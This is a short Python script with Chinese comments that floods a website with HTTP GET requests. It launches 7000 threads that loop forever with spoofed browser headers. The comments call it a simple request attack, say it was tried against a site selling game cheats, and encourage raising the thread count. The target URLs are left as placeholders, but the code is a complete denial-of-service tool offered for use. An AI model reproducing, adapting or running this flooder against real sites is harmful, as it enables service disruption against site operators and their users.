import requests
import threading

# 簡易請求攻擊(電腦不夠好的,可能伺服器沒炸,自已的電腦先炸)
# 實驗網站 : 販賣外掛的官網

def urllist():
    url = [
        "#",
    ]
    return url
def hd():
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "authority": "#",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": "#",
        "sec-fetch-mode": "no-cors",
        "sec-fetch-site": "same-origin"
    }
    return header
def get():
    while True:
        try:
            for i in range(len(urllist())):
                data = requests.get(urllist()[i],headers=hd())
                print(f"state:{data}")
                data.text
        except:continue
for i in range(7000): # 可根據自身電腦加大力度
    threading.Thread(target=get).start()